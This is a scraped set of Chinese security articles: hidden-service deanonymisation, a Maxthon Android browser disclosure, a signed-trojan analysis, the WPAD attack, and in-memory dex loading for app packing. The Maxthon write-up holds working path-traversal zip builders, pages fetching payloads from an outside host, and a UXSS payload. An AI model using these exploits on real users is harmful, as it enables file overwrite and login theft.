网络（例如Tor网络）的后面，那么客户将永远无法获取到这个暗网服务的IP地址，反之亦然，隐藏服务同样无法得知客户的IP地址。但是，隐藏服务在设计之初并没有提供任何防止服务信息外泄的保护机制。比如说，我现在运营着一大堆隐藏服务，而所有的这些服务都与我的“明网”身份有着某种联系，所以别人可以轻易地发现这些隐藏服务背后的运营者其实就是我。今天我们主要讨论的是隐藏服务无意间的身份泄漏问题，待会儿你就会看到，识别出隐藏服务的身份信息其实并不难。匿名服务的安全现状在今年年初，我曾扫描了8000多个暗网网站，希望可以找出一些包含错误配置的暗网站点。需要注意的是，由于很多隐藏服务的正常运营时间具有不确定性，因此整个扫描过程花费了我好几周的时间。在对扫描结果进行了非常详细的人工分析之后，我总结出了暗网服务目前所面临的五大安全风险。问题NO.5：开放／可读的网站目录首先，问题NO.5是开放／可读的网站目录。这种情况在“明网”中非常的常见，但是这种开放目录将会对隐藏服务的安全性带来非常严重的影响。网站管理员通常喜欢将网站资源直接存放在类似“Backup”这样的目录中，因为他们觉得没人会来查看这些目录或文件。上图显示的就是我在某个暗网服务中扫描到的网站目录，其中每一个文件夹中都包含有22个隐藏服务的相关资源。由此可以看出，所有的这些隐藏服务全部都托管在同一台网络服务器之中，其中还包括多个出售非法药物的暗网市场和一个社交网站。其实这还不是最糟糕的情况，某些隐藏服务的管理员会直接将网站的数据库备份文件（sql文件）和配置文件直接存放在“Backup”文件夹中，这才是最可怕的事情。问题NO.4：EXIF元数据问题NO.4是EXIF元数据。这类数据是编码在图片之中的，它可以告诉你这张数字相片是在哪里拍摄的、用哪种设备拍摄的、或者是用什么软件编辑的等等。实际上，EXIF元数据的安全问题早在几年前就已经出现了。比如说，你可以从暗网市场中下载一张在xxxx的商品图片，然后从中提取出拍照地点的GPS坐标，接下来你就可以利用地图服务的街景模式来找到这个地方了。最近，很多大型暗网市场已经开始对所有上传的图片进行重新编码了，以确保图片不会留下可被分析的元数据。但是，你仍然可以在很多小型网站或产品厂商页面中找到包含EXIF元数据的图片，虽然已经没有多少图片还包含GPS数据了，但是这些元数据仍然会给暗网服务带来安全问题。上面这张截图显示的是我从某个暗网市场收集到的一张图片的元数据，如果你想要了解关于这个隐藏服务的更多内容，那么这些数据绝对会非常有用。管理员在制作这张图片时，使用的是Windows还是Mac呢？他们有没有固定的制图软件？他们使用的是相机附带的编辑软件吗？别担心，EXIF元数据会告诉你一切。问题NO.3：克隆网站问题NO.3是克隆网站。在扫描过程中，我发现大约有29%的匿名服务有至少一个副本，这里的“副本”指的是网站页面内容的sha1哈希完全相同。在进行了大量分析工作之后，我发现如果暗网服务使用的是动态页面的话，那么包含至少一个副本的网站数量可能会更高。这些网站副本通常是管理员故意留下的，有可能是出于对网站均衡负载的考虑，也有可能是为了进行某些其他的活动。但是我们要知道，现在暗网中存在大量这种类型的克隆网站，这些网站可以监听并篡改合法网站所发送的网络请求，例如比特币钱包地址等等。通常情况下，辨别克隆网站的唯一方法就是仔细查看网页中的每一张图片，看看这些图片中是否有相应网站的水印或者信息识别标识。问题NO.2：SSH指纹问题NO.2是SSH指纹。每一台服务器通常只有一个唯一的公共密钥，所以我们可以通过对比两个隐藏服务所使用的SSH指纹来判断它们是否使用的是同一台服务器。除此之外，如果你的服务器存在错误配置或者主机端口对“明网”开放的话，Shodan引擎将可以搜索到你的SSH公共密钥。这样一来，他人就可以直接找到你的隐藏服务所使用的IP地址了。在研究过程中，我通过Shodan引擎发现了至少有30个暗网网站的SSH指纹配置存在安全问题。问题NO.1：Localhost绕过问题NO.1是本地主机绕过。如果你在隐藏服务中所运行的软件会给本地流量分配特殊的权限，或者是你对你的Web应用进行了额外的配置，那么就有可能发生问题1所描述的这种情况，最常见的就是Apache的mod_status模块了。我发现目前大约有6%的暗网网站存在Apache本地主机绕过问题，这种安全问题不仅会暴露服务器的IP地址，而且该服务器所托管的其他网站也将会受到影响。这种问题非常的常见，而且还会带来非常严重的影响。目前大约有12%的Apach服务器存在mod_status泄漏的问题，而且在过去的几年里，这个数字有增无减。总结在这篇文章中，主要跟大家介绍了关于暗网服务的一些基本内容，并且告诉了大家目前隐藏服务所面临的五大安全问题。在下一篇文章中，我将会给大家深入分析暗网服务的安全机制与匿名化的问题。敬请关注！","2016-11-12 13:08:04","网络安全","揭开暗网服务的神秘面纱（上）","http://nsoad.com/Article/Network-security/20161112/755.html"
"5ccbfb3e4f2f0a0a7a69c13b","Maxthon Browser（傲游浏览器） 又是一个当下比较流行的 Android 浏览器，未使用Android 的 stock 浏览器（AOSP）。我在 Android 版的浏览器中发现了一些有趣的甚至有些严重","kong","Maxthon Browser（傲游浏览器） 又是一个当下比较流行的 Android 浏览器，未使用Android 的 stock 浏览器（AOSP）。我在 Android 版的浏览器中发现了一些有趣的甚至有些严重的漏洞，可能导致远程代码执行和信息泄漏。漏洞要点：暴露的 JavaScript 接口导致任意文件写入 - 恶意网页可以强制浏览器下载zip文件，浏览器将其放在 SD 卡上，然后通过调用带有 URL 参数的installWebApp方法解压缩。由于缺少对 zip 文件所包含的文件名进行输入验证，攻击者可以制作一个恶意的 zip 文件，造成路径穿越来覆盖浏览器沙盒中的任意文件。这个漏洞能被用来实现远程代码执行，相关内容我将在后面演示。登录页面暴露的 JavaScript 接口可以进行 UXSS 攻击 - 恶意网页可以通过调用 catchform 方法更改与其他域关联的自动填充登录页面表单数据。使用一些动态构建的 JS 代码，将自动登录信息注入到登录页面，而且浏览器没有正确输出编码数据，因此我们可以利用这一点开展登录页面的 UXSS 攻击。暴露的 JavaScript 接口允许将 SQL 语句注入到客户端的 SQLite 数据库 - 设计为保存自动填充表单信息的代码也易受 SQL 注入攻击。它可能破坏客户端数据库或者远程提取自动填充表中所有信息，包括保存的登录凭据。虽然我能够找到一些在 Android 应用程序中由 IPC 触发的客户端 SQL 注入漏洞的例子（例如来自Dominic Chell的此类漏洞），和一个由来自 Baidu X-Team WAP 推送触发的客户端 SQL 注入的例子。我目前找不到有关在 Android 平台从 SQLite 远程窃取数据的公开实例。因此，这可能是针对 Android 应用程序的远程客户端 SQL 注入的第一个公开实例，其中可以使用登录页面， UXSS exploit 作为外部通信技术将数据从 SQLite 数据库中窃取出来。如果有其他有趣的例子，请 Ping 我。JS 接口攻击面傲游浏览器使用 addJavascriptInterface 方法将多个 Java 对象注入到加载网页的 Webview 中。在旧的设备（系统版本低于4.2）上，可以轻而易举地远程执行代码，参照：gain RCE by abusing reflection(pix)。在新的设备上，我们必须探索与 JS 接口相关的每个暴露的方法，来寻找可能被利用的有趣功能。这个应用程序的 JS 接口攻击面很大，这使我们的工作变得更简单或者更难，就取决于你如何看待这个问题了。请考虑以下真实情况：所有的 Java 方法都通过 傲游浏览器暴露给网页中不受信任的 JS 代码。译者注： 我们在逆向 Android 程序的时候，比如此例是浏览器应用，我们可以先在逆向工具中搜索一些敏感的方法/函数，像 jsCall这种会涉及到与 js 交互断点方法，getContent 这种与文件内容有交互的方法等。在 JEB 中，善用其强大的反编译和搜索功能： com.mx.jsobject.AppcenterLocalImplMethods: jsCallcom.mx.browser.navigation.reader.caMethods: getContentcom.mx.jsobject.JsObjAppcenterMethods: jsCallcom.mx.jsobject.JsObjAutoFillMethods: catchform, enableAutoFill, getLoginButtonSignatureCodes, getNonLoginButtonSignatureCodes, * getNonUsernameSignatureCodes, getTest, getUsernameSignatureCodescom.mx.jsobject.JsObjGuestSignInMethods: getPostUrl, signincom.mx.jsobject.JsObjMxBrowserMethods: addLauncherShortcut, getAndroidId, getChannelId, getCountry, getDeviceId, getDeviceType, * getEncodedDeviceCloudId, getLanguage, getMxLang, getObjectName, getPlatformCode, getSysReleaseVersion, * getVersionCode, getVersionName, installWebApp, isAutoLoadImage, isSupportTimeLine, shareMsgToWXTimeLine, * shareToAll, shareToSinaWeibo, shareToSinaWeibo, shareToWXTimeLine, shareToWeChatTimeLinecom.mx.jsobject.JsObjNextPageMethods: notifyFoundNextPagecom.mx.browser.readmode.JsObjReadDetectMethods: notifyReadModeSuccesscom.mx.browser.readmode.JsObjReadNextMethods: notifyReadModeFail, notifyReadModeSuccesscom.mx.jsobject.JsObjShareHelperMethods: shareTocom.mx.jsobject.JsTouchIconExtractorMethods: onReceivedTouchIconscom.mx.browser.readmode.ReadModeActivity$JsObjReadHtmlMethods: changeColorMode, getHtml, notifyFontSizeChanged, pageDowncom.mx.browser.navigation.reader. RssNewsReaderActivity$ReaderForLocalClientView$JsObjRssReaderMethods: getAuthor, getContent, getObjectName, getSource, getTime, getTitle, loadImage, openImageBrowsercom.mx.browser.navigation.reader. RssNewsReaderActivity$ReaderForPushClientView$JsObjRssReaderMethods: getAuthor, getContent, getSouce, getTime, getTitle寻找任意文件写入漏洞在反编译代码中查看了很多暴露的方法，我看到了一个叫 installWebApp 的方法。   @JavascriptInterface public void installWebApp(String arg4) {        String v0 = t.a(arg4);        p.a(arg4, ""/sdcard/webapp/"" + v0, null);        u.b(""/sdcard/webapp/"" + v0);        d.b().a();        Toast.makeText(this.mContext, ""webapp installed"", 1).show();    }然后我继续审计由 installWebApp 方法调用的所有方法的反编译代码。1） com.mx.c.t 的一个方法是将 URL 转换为文件名。比如，如果你向该方法中提供 http://www.example.org/blah.zip，则它返回 blah.zip。 2） com.mx.browser.f.p 的 a 方法使用 Apache HttpClient 下载所提供的 URL，然后使用所提供的文件名（/sdcard/webapp/[zip filename]）保存该文件。 3） com.mx.c.u 的 b 方法使用 ZipFile和ZipEntry解压 SD 卡上的文件，相关类的代码如下所示。注意 zip 没有针对每条文件名的输入验证。   public static void b(String arg8) {        File v4;        Object v0_2;        try {            File v0_1 = new File(arg8);            String v1 = arg8.substring(0, arg8.length() - 4);            new File(v1).mkdir();            System.out.println(v1 + "" created"");            ZipFile v2 = new ZipFile(v0_1);            Enumeration v3 = v2.entries();            do {            label_20:                if(!v3.hasMoreElements()) {                    return;                }                v0_2 = v3.nextElement();                v4 = new File(v1, ((ZipEntry)v0_2).getName());                v4.getParentFile().mkdirs();            }            while(((ZipEntry)v0_2).isDirectory());            System.out.println(""Extracting "" + v4);            BufferedInputStream v5 = new BufferedInputStream(v2.getInputStream(((ZipEntry)v0_2)));            byte[] v0_3 = new byte[1024];            BufferedOutputStream v4_1 = new BufferedOutputStream(new FileOutputStream(v4), 1024);            while(true) {                int v6 = v5.read(v0_3, 0, 1024);                if(v6 == -1) {                    break;                }                v4_1.write(v0_3, 0, v6);            }            v4_1.flush();            v4_1.close();            v5.close();            goto label_20;        }        catch(IOException v0) {            System.out.println(""IOError :"" + v0);        }    }这时，我停止了逆向这个方法，因为很明显加载到浏览器中的恶意网页可能会使应用程序下载并解压放在攻击者服务器上的 zip 文件。而且由于缺少对 zip 每条文件名的输入验证，我们可以穿越路径来覆盖浏览器可以访问到的任意文件。利用任意文件写入漏洞第一部分 - 一个简单的 PoC首先，我们需要使用以下 Python 代码构建恶意 zip 文件。 此处仅供参考，这里假设 /sdcard/ 已经软链接至 /storage/emulated/legacy/ 目录。最后 ，浏览器将 maxFileWriteTest.txt 写入到/storage/emulated/legacy/webapp/maxFileWriteTest9843/../../../data/data/com.mx.browser/maxFileWriteTest.txt 文件, 相当于/data/data/com.mx.browser/maxFileWriteTest.txt。import zipfile  import sysif __name__ == ""__main__"":      try:        with open(""maxFileWriteTest.txt"", ""r"") as f:            binary = f.read()            zipFile = zipfile.ZipFile(""maxFileWriteTest9843.zip"", ""a"", zipfile.ZIP_DEFLATED)            info = zipfile.ZipInfo(""maxFileWriteTest9843.zip"")            zipFile.writestr(""../../../../../data/data/com.mx.browser/files/maxFileWriteTest.txt"", binary)            zipFile.close()    except IOError as e:        raise e然后我们使用 unzip 命令列出归档文件，以验证是否正确创建了 zip 文件。看起来效果不错。$ unzip -l maxFileWriteTest9843.zipArchive:  maxFileWriteTest9843.zip    Length     Date   Time    Name --------    ----   ----    ----        4  02-11-16 15:38   ../../../../../data/data/com.mx.browser/files/maxFileWriteTest.txt --------                   -------        4                   1 fileOk，现在构建的恶意页面，强行让浏览器使用 installWebApp方法下载并解压了我们的文件。&lt;html&gt;  &lt;body&gt;  &lt;script&gt;  mmbrowser.installWebApp(""http://d3adend.org/test/maxFileWriteTest9843.zip"");  &lt;/script&gt;  &lt;/body&gt;  &lt;/html&gt;  当浏览器访问恶意页面时，“webapp” 会自动安装。检查 /data/data/com.mx.browser/files 目录，显然我们可以将任意文件写入浏览器的应用程序目录。对受害者来说，唯一可能会察觉的迹象是一个弹出状态信息，告诉用户 “webapp installed”。—— 文件写入 /data/data/com.mx.browser/files 路径。寻找登录页面的 UXSS 漏洞构建这个漏洞页面所需的就是将包含目标 URL，用户名和密码的 JSON payload 传递给 mxautofill 的 catchform 方法，如下面的 HTML 和 JavaScript 代码所示。&lt;html&gt;  &lt;body&gt;  &lt;script&gt;  var json = '{""documentURI"":""https://accounts.google.com/"",""inputs"":[{""id"":""username"",""name"":""username"",""value"":""loginxsstest@gmail.com""},{""id"":""password"",""name"":""password"",""value"":""fakepassword\'-alert(\'LoginUXSS:\'+document.domain)-\'""}]}';  mxautofill.catchform(json);  &lt;/script&gt;  &lt;/body&gt;  &lt;/html&gt;  当用户访问恶意页面时，系统会提示用户“save your account?”，并且用户必须点击 ”Yes“ ，浏览器才回保存自动填充信息。用户授权时会把它当做当前域的自动填充信息，而不是在其他任何域下。—— 受害者被提示”Save your account？“下次受害者访问 Google 登录页面时，浏览器通过 com.mx.browser.a.e 类中的 WebView 的 loadUrl 方法将以下 JavaScript 插入到页面中。javascript:mx_form_fill('loginxsstest@gmail.com' , 'fakepassword'-alert('LoginUXSS:'+document.domain)-'')然后在 accounts.goolge.com 的页面会显示弹出窗口信息。—— 我们的 JavaScript 在 Google 的登录页面得以执行任意文件写入二 —— 覆盖数据库以便不需要用户交互即可触发 UXSS通常利用登录页面进行 UXSS 需要一些用户交互，因为受害者需要对”save your account？“ 提示弹窗点击 ”Yes“，但是鉴于存在任意文件写入漏洞，我们可以配合漏洞在没有用户交互的情况下施展攻击链，参考以下步骤。1） 创建包含多个主流域名的自动填充信息的 SQLite 数据库（mxbrowser_default.db）。同样地，我们将在用户名字段注入我们的 JavaScript 代码。2） 创建一个 zip 文件，利用目录穿越来覆盖浏览器的 SQLite 数据库（mxbrowser_default.db）。3）欺骗受害者浏览器浏览到能够触发 installWebApp 方法的恶意页面，这会让受害者的浏览器自动下载并解压缩我们的 zip 文件。此时，受害者的 SQLite 数据库将替换为我们制作的数据库。4） 下一次受害者访问其中一个域名的登录页面时，我们的 JavaScript 代码将会注入到页面中。我仅从我的设备（/data/data/com.mx.browser/databases/mxbrowser_default.db）中提取出相关的 SQLite 数据库，并使用 SQLite 客户端修改了 mxautofill 表。-- 在多个域名的用户名字段中包含了 XSS payload 恶意 SQLite 数据库我们可以使用以下 Python 代码来构建 zip 文件，import zipfile  import sysif __name__ == ""__main__"":      try:        with open(""mxbrowser_default.db"", ""r"") as f:            binary = f.read()            zipFile = zipfile.ZipFile(""maxFileWriteToLoginUXSS6324.zip"", ""a"", zipfile.ZIP_DEFLATED)            zipFile.writestr(""../../../../../data/data/com.mx.browser/databases/mxbrowser_default.db"", binary)            zipFile.close()    except IOError as e:        raise e然后我们制作调用了 installWebApp 方法的 HTML 页面。&lt;html&gt;  &lt;body&gt;  &lt;script&gt;  mmbrowser.installWebApp(""http://d3adend.org/test/maxFileWriteToLoginUXSS6324.zip"");  &lt;/script&gt;  &lt;/body&gt;  &lt;/html&gt;  此时如果受害者使用傲游浏览器访问恶意页面，那么他们的本地 SQLite 数据库将被我们制作的数据库覆盖，当当受害者访问 Yahoo ，Twitter 或者 Google 登录页面时，我们的 JavaScript 代码将执行。—— 受害者访问恶意网页，并自动安装”webapp“。此时受害者的本地数据库已被覆盖。—— 我们的 JavaScript 代码在 Google 的登录页面再一次执行。","2016-11-15 13:52:48","移动安全","傲游浏览器漏洞系列（上）- 任意文件写入，UXSS","http://nsoad.com/Article/MobileSecurity/20161115/776.html"
"5ccbfb3e4f2f0a0a7a69c13c","近期360白名单分析组捕获到一批具有知名网络公司数字签名的木马，为了阻止木马的进一步危害，同时也为了提醒其他安全厂商，白名单组对本次事件进行了回顾。一、带知名公司签","silence","近期360白名单分析组捕获到一批具有知名网络公司数字签名的木马，为了阻止木马的进一步危害，同时也为了提醒其他安全厂商，白名单组对本次事件进行了回顾。一、带知名公司签名的木马以下是最新捕获的某知名网络公司数字签名的木马：我们对木马相关作者进行了持续的关注与追踪，其大概的更新时间线如下：显然这些知名公司是不可能签发木马的，那么为什么木马会有知名公司的数字签名呢？这是一个让人困惑的问题，为了找到事件的根源我们进行了追踪。二、伪造数字签名的原理通过对比知名公司的文件和木马文件，发现两者数字证书的颁发机构不同。由于不同的颁发机构可以为同一家公司颁发证书，但是审核标准不一致，所以黑客就利用了这点成功申请了知名公司的数字证书。如下图所示：以某家颁发机构数字证书的申请流程为例，公司申请证书有两个必要条件：1. 单位授权书 2. 公对公付款。如此简单的审查，导致部分颁发机构给木马作者颁发了知名公司的数字证书。对比Comodo、Thawte、Symantec几家数字签名机构，发现这三家机构需要一份公证面签书（就是当着公证员面签，并由公证处签章），这也间接导致不法分子更难申请到这些机构的数字证书。于是黑客就利用了手中的数字签名，签发了大量木马文件，由于此类文件非常容易被加入到可信任文件列表，给用户带来了极大的危害。三、伪造签名木马主要证书以下是目前为止捕获到的伪造知名公司签发木马的证书：通过上面的表格，我们可以看到木马利用了相对容易申请的机构来申请数字证书，而且持续不断的签发木马程序。此次安全事件给数字签名机构敲响了警钟，审核过程需要更加严格。四、带签名的木马基本行为带有知名公司签名的木马，不但利用了正规的数字签名，还进行了白文件利用，手段极其老练和成熟，对此白名单组进行了深入的分析：安装包在d:\windows目录下释放两个文件Auncher.exe是TX白签名文件OutSupport.dll是暴风黑签名文件通过TX文件的白利用,Auncher.exe调用OutSupport.dll中的导出函数G_SAEF\创建傀儡进程注入代码到notepad.exe中设置傀儡进程EIP最后在内存中执行木马程序。以下就是整个流程：五、杀毒的查杀对于此类最新的利用审核机构审核不严格，伪造正规公司资料骗取合法签名并且签发的木马，360杀毒进行了第一时间的查杀。","2016-08-17 00:52:24","Web安全","被攻陷的数字签名：国内某知名网络公司签名被盗案例","http://nsoad.com/Article/web/20160817/298.html"
"5ccbfb484f2f0a0a7a69c13d","作为一名渗透测试人员,我想做的第一件事是获取一个内部网络的系统访问权限。为了达到这个目的,其中一种方法是对NetBIOS-NS或它的前身LLMNR广播消息做出应答,告诉请求主机我","dalamar","黑客可以在最依赖HTTPs的地方——Wi-Fi热点处发动攻击。HTTPS加密能够提供一种关键性的保护,它让攻击者在远程监控终端用户的网络流量时,无法看见用户访问过的网站的地址。现在,研究人员设计出了一种新的攻击方法,可以打破这种保护。攻击者可以在各种类型的网络中发动这种攻击,甚至是在公共Wi-Fi中也可以,而这可以说是最依赖HTTPS的一种网络。该攻击主要利用了一种名为WPAD(Web Proxy Autodisovery)的特性,这种特性会将某些浏览器请求暴露给攻击者,然后攻击者就可以看到目标用户访问过的每个网站的URL了。这种利用几乎对所有的浏览器和操作系统都有不利的影响。在下周位于拉斯维加斯的黑帽安全会议上,这种新的攻击将会在一场演讲中被演示出来。Itzik Kotler是 SafeBreach安全公司的联合创始人和首席技术官,同时也是上述会议的一名演讲者,她在一封电子邮件中写道:“即使局域网和Wi-Fi不可信(例如公共酒店、咖啡馆、机场、餐厅的公共Wi-Fi),人们还是依赖HTTPS来保证他们的通信安全。我们已经向人们展示过,在启用WPAD时,HTTPS无法提供安全保障,因此,很多人在通过非可信网络进行浏览时,事实上就已经暴露在这种攻击面前了。”除了URL,其他的HTTPs流量也会受到攻击的影响,并且在某些情况下, URL的暴露就已经可以对安全造成致命的打击了。例如,OpenID标准会使用URL来验证用户和服务。另一个例子是谷歌和Dropbox提供的文件共享服务,它会向用户发送一个包含URL的安全令牌,继而进行工作。许多密码重置机制也同样依赖于基于URL的安全令牌。攻击者只要在上述的任何一种情况下获得这些URL,就能进入目标用户的帐户、获取他们的数据。最可能的攻击方式是,当一台电脑尝试使用动态主机配置协议连接到网络时,攻击者会发送一个恶意响应。攻击者可以使用DHCP来帮助建立一个代理服务器,当浏览器试图访问特定的URL时,使用的就将是这个代理服务器。这种攻击的原理是,强制浏览器获得PAC (proxy autoconfig)文件,该文件在遇到指定类型的URL时,会触发代理的运作。由于在HTTPS连接建立起来之前,恶意的PAC代码就已经接收到了请求,因此攻击者可以获取完整的明文URL。第二种攻击方式是,利用恶意软件修改目标设备的网络设置,进而使用一个代理。在上述的两种情况下,受攻击的目标都不会看到任何危险的信号,浏览器地址栏也仍然显示出HTTPS连接是有效的。不同之处在于,在第一个场景中,计算机的网络选项(例如Mac的网络设置中的代理选项卡)将显示它使用了自动配置的代理,但没有更详细的说明。而在第二个方法中,计算机的网络配置中不仅会显示使用了自动配置的代理,还将显示攻击者的URL。这并不是唯一一种利用WPAD和PAC发动的攻击。今年4月,研究人员记录到,一种名为BlackMoon的银行木马在受感染的计算机上安装PAC文件,当用户访问目标网站时,会将其浏览器重定向到网络钓鱼页面。文件中还包含一个JavaScript函数,BlackMoon利用它来截获用户的凭证,并且故意使目标银行网站变得模糊。在下周的黑帽大会上,人们会对这件事情进行单独的讨论。在黑帽网站上有这样的一些内容:“演讲者将会分享他的团队对WPAD进行实验时的过程,他们探究的是WPAD是否仍然存在问题,或者问题是否已经被软件和操作系统供应商修复。在这个实验中,研究者分别在内部网和开放网络中发动了攻击。”这种PAC攻击利用的是在1999年起草的WPAD规范内的漏洞,这意味着操作系统或浏览器供应商很难修复这种漏洞。不过, 微软的Edge和Internet Explorer 11在很大程度上可以避开这些漏洞,因为它们调用了FindProxyForUrl函数,缩短了URL的长度,只留下主机名,这和包含了身份验证令牌或凭证的完整URL是完全不同的。SafeBreach安全研究部的副总裁Amit Klein在一封电子邮件中说:“这样做的话, 可以将暴露协议数据的可能性降到最低(仅含主机名), 因为有了DNS查询,主机名早已不是秘密,因此我们认为这不太敏感。用户也可以采取措施来禁用WPAD,但在连接到某个给定的网络时,这些解决办法是没有效果的。”","2016-08-01 00:16:05","Web安全","新的攻击方法可以绕过Mac 、Windows和Linux平台上的HTTPS加密保护","http://nsoad.com/Article/web/20160801/235.html"
"5ccbfb484f2f0a0a7a69c13e","本文来自i春秋作者: penguin_wwy零、问题出现对dex文件进行加密，解密后动态加载是一种常用的加壳方式（一代壳以这种方式为主）。但这种在解密之后往往会产生一个解密后的完","Blackhold","本文来自i春秋作者: penguin_wwy零、问题出现对dex文件进行加密，解密后动态加载是一种常用的加壳方式（一代壳以这种方式为主）。但这种在解密之后往往会产生一个解密后的完整dex。过程一般是这样的 打开文件File file = new File(""classes.dex"");读取字节码byte[] buffer = new FileInputStream(file).read();解密字节码decrypt(buffer)重写到文件File newFile = new File(""classes_decrypt.dex"");new FileOutputStream(newFile).write(buffer);加载dexDexClassLoader dexClassLoader = new DexClassLoader(""classes_decrypt.dex""...);可见在重写到文件这一步，就有可能被截获到解密后的dex，那加密dex的意义就完全不存在了。 当然也有过许多办法，比如加载完后删除文件、或者隐藏文件等等，但都没法从根本上解决问题。而最有实际意义的方法就是今天要说的，不落地加载dex。一、理论基础不落地的含义就是说在解密后直接由字节码进行加载，不需要变成dex文件。Dalvik中的两种类加载器DexClassLoader和PathClassLoader显然都不具备这个能力。我们需要自己定义一个类加载器。 那如何自己定义呢？我们先分析一下DexClassLoader加载的过程（详细分析请看我的博客）。这里简单说明一下，首先是DexClassLoader的构造函数 源码位置 libcore\dalvik\src\main\java\dalvik\system\DexClassLoader.javapublic class DexClassLoader extends BaseDexClassLoader {  /*** Creates a {[url=home.php?mod=space&amp;uid=74926]@Code[/url] DexClassLoader} that finds interpreted and native* code. Interpreted classes are found in a set of DEX files contained* in Jar or APK files.** &lt;p&gt;The path lists are separated using the character specified by the* {@code path.separator} system property, which defaults to {@code :}.** @param dexPath the list of jar/apk files containing classes and* resources, delimited by {@code File.pathSeparator}, which* defaults to {@code "":""} on Android* @param optimizedDirectory directory where optimized dex files* should be written; must not be {@code null}* @param libraryPath the list of directories containing native* libraries, delimited by {@code File.pathSeparator}; may be* {@code null}* @param parent the parent class loader*/public DexClassLoader(String dexPath, String optimizedDirectory,  String libraryPath, ClassLoader parent) {  super(dexPath, new File(optimizedDirectory), libraryPath, parent);  }}实质上是对它的父类，BaseDexClassLoader的构造 源码位置 libcore\dalvik\src\main\java\dalvik\system\BaseDexClassLoader.javapublic BaseDexClassLoader(String dexPath, File optimizedDirectory,  String libraryPath, ClassLoader parent) {  super(parent);  this.pathList = new DexPathList(this, dexPath, libraryPath, optimizedDirectory);  }libcore\dalvik\src\main\java\dalvik\system\DexPathList.javapublic DexPathList(ClassLoader definingContext, String dexPath,  String libraryPath, File optimizedDirectory) {  if (definingContext == null) {  throw new NullPointerException(""definingContext == null"");  } if (dexPath == null) {  throw new NullPointerException(""dexPath == null"");  } if (optimizedDirectory != null) {  if (!optimizedDirectory.exists()) {  throw new IllegalArgumentException(  ""optimizedDirectory doesn't exist: ""+ optimizedDirectory);} if (!(optimizedDirectory.canRead()  &amp;&amp; optimizedDirectory.canWrite())) {throw new IllegalArgumentException(  ""optimizedDirectory not readable/writable: ""+ optimizedDirectory);}} this.definingContext = definingContext;  this.dexElements = makeDexElements(splitDexPath(dexPath), optimizedDirectory);  this.nativeLibraryDirectories = splitLibraryPath(libraryPath);  }重点在函数makeDexElementsprivate static Element[] makeDexElements(ArrayList&lt;File&gt; files,  File optimizedDirectory) {  ArrayList&lt;Element&gt; elements = new ArrayList&lt;Element&gt;();   /** Open all files and load the (direct or contained) dex files* up front.*/for (File file : files) {  File zip = null;  DexFile dex = null;  String name = file.getName();   if (name.endsWith(DEX_SUFFIX)) {  // Raw dex file (not inside a zip/jar).try {  dex = loadDexFile(file, optimizedDirectory);  } catch (IOException ex) {System.logE(""Unable to load dex file: "" + file, ex);  }} else if (name.endsWith(APK_SUFFIX) || name.endsWith(JAR_SUFFIX)|| name.endsWith(ZIP_SUFFIX)) {zip = file;   try {  dex = loadDexFile(file, optimizedDirectory);  } catch (IOException ignored) {/** IOException might get thrown ""legitimately"" by* the DexFile constructor if the zip file turns* out to be resource-only (that is, no* classes.dex file in it). Safe to just ignore* the exception here, and let dex == null.*/}} else if (file.isDirectory()) {// We support directories for looking up resources.// This is only useful for running libcore tests.elements.add(new Element(file, true, null, null));  } else {System.logW(""Unknown file type for: "" + file);  } if ((zip != null) || (dex != null)) {  elements.add(new Element(file, false, zip, dex));  }} return elements.toArray(new Element[elements.size()]);  }根据文件后缀名的判断选择分支，然后调用loadDex函数private static DexFile loadDexFile(File file, File optimizedDirectory)  throws IOException {  if (optimizedDirectory == null) {  return new DexFile(file);  } else {String optimizedPath = optimizedPathFor(file, optimizedDirectory);  return DexFile.loadDex(file.getPath(), optimizedPath, 0);  }}DexFile.loadDex这个函数的内部也只是构造一个DexFile对象，所以直接看DexFile的构造函数就好private DexFile(String sourceName, String outputName, int flags) throws IOException {  if (outputName != null) {  try {  String parent = new File(outputName).getParent();  if (Libcore.os.getuid() != Libcore.os.stat(parent).st_uid) {  throw new IllegalArgumentException(""Optimized data directory "" + parent  + "" is not owned by the current user. Shared storage cannot protect""+ "" your application from code injection attacks."");}} catch (ErrnoException ignored) {// assume we'll fail with a more contextual error later}} mCookie = openDexFile(sourceName, outputName, flags);  mFileName = sourceName;  guard.open(""close"");  //System.out.println(""DEX FILE cookie is "" + mCookie);}重点的重点在openDexFile，这个函数负责最终的dex文件加载运行流程DexClassLoader ——&gt; BaseDexClassLoader ——&gt; DexPathList ——&gt; makeDexElements ——&gt; loadDex ——&gt; DexFile这个openDexFile函数是一个native函数，在libdvm.so中，看对应的函数表const DalvikNativeMethod dvm_dalvik_system_DexFile[] = {  { ""openDexFile"", ""(Ljava/lang/String;Ljava/lang/String;I)I"", Dalvik_dalvik_system_DexFile_openDexFile },  { ""openDexFile"", ""([B)I"", Dalvik_dalvik_system_DexFile_openDexFile_bytearray },  { ""closeDexFile"", ""(I)V"", Dalvik_dalvik_system_DexFile_closeDexFile },  { ""defineClass"", ""(Ljava/lang/String;Ljava/lang/ClassLoader;I)Ljava/lang/Class;"", Dalvik_dalvik_system_DexFile_defineClass },  { ""getClassNameList"", ""(I)[Ljava/lang/String;"", Dalvik_dalvik_system_DexFile_getClassNameList },  { ""isDexOptNeeded"", ""(Ljava/lang/String;)Z"", Dalvik_dalvik_system_DexFile_isDexOptNeeded },  { NULL, NULL, NULL }, };调用表中第一个openDexFile所对应的Dalvik_dalvik_system_DexFile_openDexFile ，这个就是实际执行的函数，函数参数 ""(Ljava/lang/String;Ljava/lang/String;I)I"" 两个字符串一个整型。 而意外的发现在它的下一个位置Dalvik_dalvik_system_DexFile_openDexFile_bytearray，它的参数 ([B)I 一个byte数组和一个整型，也就是说如果我们直接调用这个函数的话，就可以将字节码以一个byte数组的形式传入。了解到这里，我们的目标就清晰了。（1）构造一个我们自己的类加载器（2）通过Dalvik_dalvik_system_DexFile_openDexFile_bytearray，来加载dex文件的字节码二、开工实践下面我们就来尝试实现一下，首先我们需要一个正常的Apk，越简单越好，最好不需要太多资源文件，加载了dex能直接运行，毕竟只是实验一下。上一篇当中的TestApk就很合适。解压出它的classes.dex，放到手机/data/local/tmp文件夹下然后新建一个Apk，就叫DexFile, 准备一个java类，负责native函数public class JNITool {  static {  System.loadLibrary(""JNITool"");  } public static native int loadDex(byte[] dex,long dexlen);  }这个loadDex就负责通过我们前面所述的函数加载dex。在JNITool.so，我们要加载libdvm.so并且找到Dalvik_dalvik_system_DexFile_openDexFile_bytearray函数 所以需要定义JNI_OnLoad函数JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved) {   void *ldvm = (void*) dlopen(""libdvm.so"", RTLD_LAZY); 